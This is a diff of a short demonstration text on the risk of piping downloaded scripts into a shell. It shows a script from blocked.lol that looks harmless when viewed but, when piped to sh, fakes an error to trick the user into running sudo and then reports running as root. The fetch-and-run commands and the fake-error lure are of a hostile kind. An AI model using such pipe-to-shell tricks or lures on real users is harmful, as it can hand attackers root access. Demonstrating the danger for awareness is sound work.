@@ -1,33 +1,33 @@
 
-              @@@@@@@   @@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@
-              @@@@@@@@  @@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@
-              @@!  @@@  @@!  @@!  @@@  @@!  @@!@!@@@  !@@
-              !@!  @!@  !@!  !@!  @!@  !@!  !@!!@!@!  !@!
-              @!@@!@!   !!@  @!@@!@!   !!@  @!@ !!@!  !@! @!@!@
-              !!@!!!    !!!  !!@!!!    !!!  !@!  !!!  !!! !!@!!
-              !!:       !!:  !!:       !!:  !!:  !!!  :!!   !!:
-              :!:       :!:  :!:       :!:  :!:  !:!  :!:   !::
-               ::        ::   ::        ::   ::   ::   ::: ::::
-               :        :     :        :    ::    :    :: :: :
+          @@@@@@@   @@@  @@@@@@@   @@@  @@@  @@@   @@@@@@@@
+          @@@@@@@@  @@@  @@@@@@@@  @@@  @@@@ @@@  @@@@@@@@@
+          @@!  @@@  @@!  @@!  @@@  @@!  @@!@!@@@  !@@
+          !@!  @!@  !@!  !@!  @!@  !@!  !@!!@!@!  !@!
+          @!@@!@!   !!@  @!@@!@!   !!@  @!@ !!@!  !@! @!@!@
+          !!@!!!    !!!  !!@!!!    !!!  !@!  !!!  !!! !!@!!
+          !!:       !!:  !!:       !!:  !!:  !!!  :!!   !!:
+          :!:       :!:  :!:       :!:  :!:  !:!  :!:   !::
+           ::        ::   ::        ::   ::   ::   ::: ::::
+           :        :     :        :    ::    :    :: :: :
 
 
-        @@@@@@@   @@@@@@      @@@@@@@    @@@@@@    @@@@@@   @@@  @@@
-        @@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@
-          @@!    @@!  @@@     @@!  @@@  @@!  @@@  !@@       @@!  @@@
-          !@!    !@!  @!@     !@   @!@  !@!  @!@  !@!       !@!  @!@
-          @!!    @!@  !@!     @!@!@!@   @!@!@!@!  !!@@!!    @!@!@!@!
-          !!!    !@!  !!!     !!!@!!!!  !!!@!!!!   !!@!!!   !!!@!!!!
-          !!:    !!:  !!!     !!:  !!!  !!:  !!!       !:!  !!:  !!!
-          :!:    :!:  !:!     :!:  !:!  :!:  !:!      !:!   :!:  !:!
-           ::    ::::: ::      :: ::::  ::   :::  :::: ::   ::   :::
-           :      : :  :      :: : ::    :   : :  :: : :     :   : :
+    @@@@@@@   @@@@@@      @@@@@@@    @@@@@@    @@@@@@   @@@  @@@
+    @@@@@@@  @@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@
+      @@!    @@!  @@@     @@!  @@@  @@!  @@@  !@@       @@!  @@@
+      !@!    !@!  @!@     !@   @!@  !@!  @!@  !@!       !@!  @!@
+      @!!    @!@  !@!     @!@!@!@   @!@!@!@!  !!@@!!    @!@!@!@!
+      !!!    !@!  !!!     !!!@!!!!  !!!@!!!!   !!@!!!   !!!@!!!!
+      !!:    !!:  !!!     !!:  !!!  !!:  !!!       !:!  !!:  !!!
+      :!:    :!:  !:!     :!:  !:!  :!:  !:!      !:!   :!:  !:!
+       ::    ::::: ::      :: ::::  ::   :::  :::: ::   ::   :::
+       :      : :  :      :: : ::    :   : :  :: : :     :   : :
 
 
-                            - a short novel -
+                        - a short novel -
 
 
 Nowadays it's very common for installation scripts to just recommend
-running something like $ curl -sL https://ourdomain.com/install | sh
+running something like curl -sL https://ourdomain.com/install | sh
 
 You want to get it working ASAP? You just run it.
 
@@ -35,7 +35,7 @@ Have you ever been bitten by someone modifying these scripts?
 
 You'd probably do this then:
 
-$ curl -sL https://blocked.lol/greetz.sh
+$ curl -sL blocked.lol/greetz.sh
 # blocked.lol greetingz shell script 2020
 # We declare USERNAME variable with the result of whoami
 USERNAME=$(whoami)
@@ -45,10 +45,11 @@ echo "Hello $USERNAME"
 
 Fine, this script is safe after all... but wait, what?
 
-$ curl -sL https://blocked.lol/greetz.sh | sh
--e
+$ curl -sL blocked.lol/greetz.sh | sh
 curl is desynchronized!
 Run sudo curl -sS ntppool.org to fix
+
+Weird, never seen this one, but let's go
 $ sudo curl -sS ntppool.org
 Password:
 <html>
@@ -58,7 +59,9 @@ Password:
 <hr><center>nginx/1.17.8</center>
 </body>
 </html>
-$ curl -sL https://blocked.lol/greetz.sh | sh
+
+Hm, ok let's try again...
+$ curl -sL blocked.lol/greetz.sh | sh
 Hello root
 I am root! Try cat -t on greetz.sh
 
@@ -85,4 +88,4 @@ I am root! Try cat -t on greetz.sh
 
 Do you want to know what happened? Run this
 
-$ curl -sL https://blocked.lol/greetz.sh | cat -t
+$ curl -sL blocked.lol/greetz.sh | cat -t
